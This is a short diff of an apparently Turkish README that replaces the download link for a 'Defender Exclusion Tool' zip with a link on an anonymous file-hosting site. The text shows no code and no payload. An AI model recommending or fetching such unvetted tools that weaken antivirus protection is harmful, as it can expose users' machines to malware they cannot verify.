@@ -22,4 +22,4 @@ Microsoft Defender Antivirüs ya da üçüncü taraf bir antivirüs çözümü s
 
 ## İndir
 
-[Dosyayı İndir](https://vip.shades-cloud.workers.dev/0:/vip-shades/Defender_Exclusion_Tool%20-%20v1.0.zip)
+[Dosyayı İndir](https://pixeldrain.com/u/QSMd1AcU)
